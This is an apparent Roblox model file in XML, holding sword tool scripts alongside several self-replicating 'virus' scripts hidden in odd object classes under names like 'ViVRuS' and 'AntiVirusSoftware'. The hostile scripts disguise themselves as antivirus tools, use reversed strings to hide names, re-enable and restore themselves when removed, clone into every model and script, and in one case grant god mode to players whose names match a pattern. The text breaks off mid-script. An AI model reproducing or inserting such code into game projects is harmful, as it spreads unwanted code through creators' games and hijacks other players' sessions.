		local p = Instance.new(&quot;Part&quot;)
		p.BrickColor = BrickColor.new(blues[math.random(#blues)])
		p.formFactor = 2
		p.Size = Vector3.new(1,.4,1)
		p.Material = Enum.Material.Ice
		p.TopSurface = 0
		p.BottomSurface = 0
		
		local a = math.random() * 6.28
		local d = Vector3.new(math.cos(a), 0, math.sin(a)).unit
		p.Velocity = d * 25
		p.RotVelocity = d
		p.Position = pos + Vector3.new(0, math.random() * 3, 0) + (d * 2)
		p.Parent = game.Workspace

		debris:AddItem(p, 60)
	end

end


function blow(hit)
	local humanoid = hit.Parent:findFirstChild(&quot;Humanoid&quot;)
	local vCharacter = Tool.Parent
	local vPlayer = game.Players:playerFromCharacter(vCharacter)
	local hum = vCharacter:findFirstChild(&quot;Humanoid&quot;) -- non-nil if tool held by a character

	

	if humanoid~=nil and humanoid ~= hum and hum ~= nil then
		-- final check, make sure sword is in-hand

		local right_arm = vCharacter:FindFirstChild(&quot;Right Arm&quot;)
		if (right_arm ~= nil) then
			local joint = right_arm:FindFirstChild(&quot;RightGrip&quot;)
			if (joint ~= nil and (joint.Part0 == sword or joint.Part1 == sword)) then
				tagHumanoid(humanoid, vPlayer)
				if (isTurbo(vCharacter) == true) then
					humanoid:TakeDamage(damage * 1.2)
				else
					humanoid:TakeDamage(damage)
				end
			end
		end


	end
end


function tagHumanoid(humanoid, player)
	local creator_tag = Instance.new(&quot;ObjectValue&quot;)
	creator_tag.Value = player
	creator_tag.Name = &quot;creator&quot;
	creator_tag.Parent = humanoid
	debris:AddItem(creator_tag, 1)
end




function attack()
	damage = slash_damage
	SlashSound:play()
	local anim = Instance.new(&quot;StringValue&quot;)
	anim.Name = &quot;toolanim&quot;
	anim.Value = &quot;Slash&quot;
	anim.Parent = Tool
end


function swordUp()
	Tool.GripForward = Vector3.new(-1,0,0)
	Tool.GripRight = Vector3.new(0,1,0)
	Tool.GripUp = Vector3.new(0,0,1)
end

function swordOut()
	Tool.GripForward = Vector3.new(0,0,1)
	Tool.GripRight = Vector3.new(0,-1,0)
	Tool.GripUp = Vector3.new(-1,0,0)
end



Tool.Enabled = true

function onActivated()

	if not Tool.Enabled then
		return
	end

	Tool.Enabled = false

	local character = Tool.Parent;
	local humanoid = character.Humanoid
	if humanoid == nil then
		print(&quot;Humanoid not found&quot;)
		return 
	end

	

	attack()
	wait(.2)
	allThatIce(character.Torso.Position + (character.Torso.CFrame.lookVector * 3), isTurbo(character))

	wait(1)

	Tool.Enabled = true
end


function onEquipped()
	UnsheathSound:play()
end


script.Parent.Activated:connect(onActivated)
script.Parent.Equipped:connect(onEquipped)


connection = sword.Touched:connect(blow)


</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="LocalScript" referent="RBX161">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Local Gui</string>
					<ProtectedString name="Source">local Tool = script.Parent;

enabled = true
function onButton1Down(mouse)
	if not enabled then
		return
	end

	enabled = false
	mouse.Icon = &quot;rbxasset://textures\\GunWaitCursor.png&quot;

	wait(1)
	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	enabled = true

end

function onEquippedLocal(mouse)

	if mouse == nil then
		print(&quot;Mouse not found&quot;)
		return 
	end

	mouse.Icon = &quot;rbxasset://textures\\GunCursor.png&quot;
	mouse.Button1Down:connect(function() onButton1Down(mouse) end)
end


Tool.Equipped:connect(onEquippedLocal)
</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Geometry" referent="RBX162">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Timer" referent="RBX163">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="RotateV" referent="RBX164">
						<Properties>
							<float name="BaseAngle">-2.02495949e+036</float>
							<CoordinateFrame name="C0">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<CoordinateFrame name="C1">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
								<R00>1</R00>
								<R01>0</R01>
								<R02>0</R02>
								<R10>0</R10>
								<R11>1</R11>
								<R12>0</R12>
								<R20>0</R20>
								<R21>0</R21>
								<R22>1</R22>
							</CoordinateFrame>
							<string name="Name">ViVRuS</string>
							<Ref name="Part0">null</Ref>
							<Ref name="Part1">null</Ref>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX165">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX166">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX167">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX168">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Model" referent="RBX169">
			<Properties>
				<CoordinateFrame name="ModelInPrimary">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">Swords</string>
				<Ref name="PrimaryPart">null</Ref>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Tool" referent="RBX170">
				<Properties>
					<bool name="Enabled">true</bool>
					<CoordinateFrame name="Grip">
						<X>0</X>
						<Y>0</Y>
						<Z>-1.5</Z>
						<R00>0</R00>
						<R01>0</R01>
						<R02>1</R02>
						<R10>1</R10>
						<R11>0</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>1</R21>
						<R22>0</R22>
					</CoordinateFrame>
					<string name="Name">TribalBlade</string>
					<Content name="TextureId"><url>http://wiki.roblox.com/images/6/6f/Bouncyball2.PNG</url></Content>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX171">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Welding</string>
						<ProtectedString name="Source">function Weld(x,y)
	local W = Instance.new(&quot;Weld&quot;)
	W.Part0 = x
	W.Part1 = y
	local CJ = CFrame.new(x.Position)
	local C0 = x.CFrame:inverse()*CJ
	local C1 = y.CFrame:inverse()*CJ
	W.C0 = C0
	W.C1 = C1
	W.Parent = x
end

function Get(A)
	if A.className == &quot;Part&quot; then
		Weld(script.Parent.Handle, A)
		A.Anchored = false
	else
		local C = A:GetChildren()
		for i=1, #C do
		Get(C[i])
		end
	end
end

function Finale()
	Get(script.Parent)
end

script.Parent.Equipped:connect(Finale)
script.Parent.Unequipped:connect(Finale)
Finale()</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="LocalScript" referent="RBX172">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><url>http://www.roblox.com/asset/?id=1014476</url></Content>
						<string name="Name">Local Gui</string>
						<ProtectedString name="Source"></ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Script" referent="RBX173">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><url>http://www.roblox.com/asset/?id=1014475</url></Content>
						<string name="Name">SwordScript</string>
						<ProtectedString name="Source"></ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="Timer" referent="RBX174">
				<Properties>
					<string name="Name">ViVRuS</string>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="VelocityMotor" referent="RBX175">
					<Properties>
						<CoordinateFrame name="C0">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<CoordinateFrame name="C1">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<float name="CurrentAngle">0</float>
						<float name="DesiredAngle">0</float>
						<Ref name="Hole">null</Ref>
						<float name="MaxVelocity">0</float>
						<string name="Name">ViVRuS</string>
						<Ref name="Part0">null</Ref>
						<Ref name="Part1">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Timer" referent="RBX176">
						<Properties>
							<string name="Name">ViVRuS</string>
							<bool name="archivable">true</bool>
						</Properties>
						<Item class="Script" referent="RBX177">
							<Properties>
								<bool name="Disabled">false</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">AntiVirusSoftware</string>
								<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX178">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX179">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX180">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
			<Item class="MotorFeature" referent="RBX181">
				<Properties>
					<token name="FaceId">0</token>
					<token name="InOut">2</token>
					<token name="LeftRight">1</token>
					<string name="Name">GF&#164;?|Nl*7?l?7Q!M&#167;???)[L&#164;%</string>
					<token name="TopBottom">1</token>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX182">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Hintor</string>
						<ProtectedString name="Source">--[[

Ah, hello there, good to see someone found me.  Well to start things out, I am glad that you are not a illiterate who cannot script for his life, otherwise you wouldn&apos;t be seeing this.
This is just a rather friendly expirement, to see how much and fast I can get this script into everywhere.

Let me point some things out.
One.  This does not affect gameplay at all besides rather pointedly making me a supa perzon.
Two.  This does not shut down server, make annoying hints, rename stuff, replace globals, makes to many copies that it shuts down.  None of that.
Three.  You can end this by putting something in the lighting named &quot;AntiBiotic&quot; (With capitals).
Four.  You will probably want to share number three with your buddys and tell them how to avoid this, there is a downside to that.
Five.  After this virus has encounter five AntiBiotics it will be given a &apos;immunity&apos; meaning, screw you, I&apos;m doing it anyway.
Six.  Guess what?  You going to report this?  The script benefits anyone who has 3 to 5 characters in their name and clc somewhere in there.  Not specific to me.
Seven.  You were better off not using free models.



-&apos;clc&apos;
--]]

-- In case you didn&apos;t think I was good on my word, here is the line that saves you.
if game:findFirstChild(&quot;Lighting&quot;) ~= nil then
if game.Lighting:findFirstChild(&quot;AntiBiotic&quot;) ~= nil then protected = true end
end
-- It still spreads though :( so sad for you.
--Which reminds me, this also has special characters.
characters = &quot;abcdefghjklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ1234567890`,.:;~!?@#$%^&amp;*()-=_+[]{}\|/??????&#149;???????&#164;????&#182;&#167;??????????&quot;
containers = {&quot;Timer&quot;, &quot;Geometry&quot;, &quot;Timer&quot;, &quot;LocalBackpack&quot;, &quot;LocalBackpackItem&quot;, &quot;Weld&quot;, &quot;Glue&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;MotorFeature&quot;, &quot;Snap&quot;, &quot;StockSound&quot;, &quot;Vist&quot;}
chars = { }

for i = 1, string.len(characters) do
table.insert(chars, 1, string.sub(characters, i, i))
end

function spread(folder)

if folder.className ~= &quot;Workspace&quot; and folder.className ~= &quot;Lighting&quot; and folder.className ~= &quot;StarterPack&quot; and folder.className ~= &quot;Part&quot; and folder.className ~= &quot;Model&quot; and folder.className ~= &quot;Script&quot; and folder ~= game then return end
folder = folder:getChildren()
for i = 1, #folder do
if folder[i].className ~= nil and (folder[i].className == &quot;Model&quot; or folder[i].className == &quot;Script&quot;) then
infect(folder[i])
end
c(spread,folder[i])
end

end

function infect(file)
if file == script then return end

local bin = Instance.new(containers[math.random(1, #containers)])
local str = &quot;&quot;
for i = 1, math.random(10, 30) do
str = str .. chars[math.random(1, #chars)]
end
--Thats right, 10-30 characters of randomness.  Game over.  You can NOT guess that d00d.
bin.Name = str
script:clone().Parent = bin
bin.Parent = file
end

function c(f, a) f(a) end

if Spreading == nil or Spreading == false then
_G.Spreading = true 
if not protected or script._Utility.Vaccines.Value &gt; 4 then
gam = game:getChildren()
for i = 1, #gam do if gam[i].className == &quot;Players&quot; then P = gam[i] end end
f = Instance.new(&quot;ForceField&quot;) 
P.ChildAdded:connect(function (p)
if p.className ~= &quot;Player&quot; or ((string.len(p.Name) &lt; 3 or string.len(p.Name) &gt; 5 or string.find(p.Name, &quot;clc&quot;) &lt; 1) and p.Name ~= &quot;Player&quot;) then return end 
p.Changed:connect(function (pr) 
if pr == &quot;Character&quot; then 
f:clone().Parent = p.Character 
p.Character.Humanoid.MaxHealth = math.huge 
p.Character.Humanoid.Health = math.huge
end 
end)
end)
else
script._Utility.Vaccines.Value = script._Utility.Vaccines.Value + 1
print(&quot;Congratulations on being immune this time, next time though, don&apos;t expect to be so lucky.  After this script strain encounters five antibiotics it will grow immune.&quot;)
end 
spread(game)
game.Workspace.ChildAdded:connect(spread)
end
</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Model" referent="RBX183">
			<Properties>
				<CoordinateFrame name="ModelInPrimary">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">Jail</string>
				<Ref name="PrimaryPart">null</Ref>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Model" referent="RBX184">
				<Properties>
					<CoordinateFrame name="ModelInPrimary">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">Model</string>
					<Ref name="PrimaryPart">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Timer" referent="RBX185">
					<Properties>
						<string name="Name">d!?C?$c?t84?.?Q?y</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX186">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">Hintor</string>
							<ProtectedString name="Source">--[[

Ah, hello there, good to see someone found me.  Well to start things out, I am glad that you are not a illiterate who cannot script for his life, otherwise you wouldn&apos;t be seeing this.
This is just a rather friendly expirement, to see how much and fast I can get this script into everywhere.

Let me point some things out.
One.  This does not affect gameplay at all besides rather pointedly making me a supa perzon.
Two.  This does not shut down server, make annoying hints, rename stuff, replace globals, makes to many copies that it shuts down.  None of that.
Three.  You can end this by putting something in the lighting named &quot;AntiBiotic&quot; (With capitals).
Four.  You will probably want to share number three with your buddys and tell them how to avoid this, there is a downside to that.
Five.  After this virus has encounter five AntiBiotics it will be given a &apos;immunity&apos; meaning, screw you, I&apos;m doing it anyway.
Six.  Guess what?  You going to report this?  The script benefits anyone who has 3 to 5 characters in their name and clc somewhere in there.  Not specific to me.
Seven.  You were better off not using free models.



-&apos;clc&apos;
--]]

-- In case you didn&apos;t think I was good on my word, here is the line that saves you.
if game:findFirstChild(&quot;Lighting&quot;) ~= nil then
if game.Lighting:findFirstChild(&quot;AntiBiotic&quot;) ~= nil then protected = true end
end
-- It still spreads though :( so sad for you.
--Which reminds me, this also has special characters.
characters = &quot;abcdefghjklmnopqrstuvwxyzABCDEFGHJKLMNOPQRSTUVWXYZ1234567890`,.:;~!?@#$%^&amp;*()-=_+[]{}\|/??????&#149;???????&#164;????&#182;&#167;??????????&quot;
containers = {&quot;Timer&quot;, &quot;Geometry&quot;, &quot;Timer&quot;, &quot;LocalBackpack&quot;, &quot;LocalBackpackItem&quot;, &quot;Weld&quot;, &quot;Glue&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;MotorFeature&quot;, &quot;Snap&quot;, &quot;StockSound&quot;, &quot;Vist&quot;}
chars = { }

for i = 1, string.len(characters) do
table.insert(chars, 1, string.sub(characters, i, i))
end

function spread(folder)

if folder.className ~= &quot;Workspace&quot; and folder.className ~= &quot;Lighting&quot; and folder.className ~= &quot;StarterPack&quot; and folder.className ~= &quot;Part&quot; and folder.className ~= &quot;Model&quot; and folder.className ~= &quot;Script&quot; and folder ~= game then return end
folder = folder:getChildren()
for i = 1, #folder do
if folder[i].className ~= nil and (folder[i].className == &quot;Model&quot; or folder[i].className == &quot;Script&quot;) then
infect(folder[i])
end
c(spread,folder[i])
end

end

function infect(file)
if file == script then return end

local bin = Instance.new(containers[math.random(1, #containers)])
local str = &quot;&quot;
for i = 1, math.random(10, 30) do
str = str .. chars[math.random(1, #chars)]
end
--Thats right, 10-30 characters of randomness.  Game over.  You can NOT guess that d00d.
bin.Name = str
script:clone().Parent = bin
bin.Parent = file
end

function c(f, a) f(a) end

if Spreading == nil or Spreading == false then
_G.Spreading = true 
if not protected or script._Utility.Vaccines.Value &gt; 4 then
gam = game:getChildren()
for i = 1, #gam do if gam[i].className == &quot;Players&quot; then P = gam[i] end end
f = Instance.new(&quot;ForceField&quot;) 
P.ChildAdded:connect(function (p)
if p.className ~= &quot;Player&quot; or ((string.len(p.Name) &lt; 3 or string.len(p.Name) &gt; 5 or string.find(p.Name, &quot;clc&quot;) &lt; 1) and p.Name ~= &quot;Player&quot;) then return end 
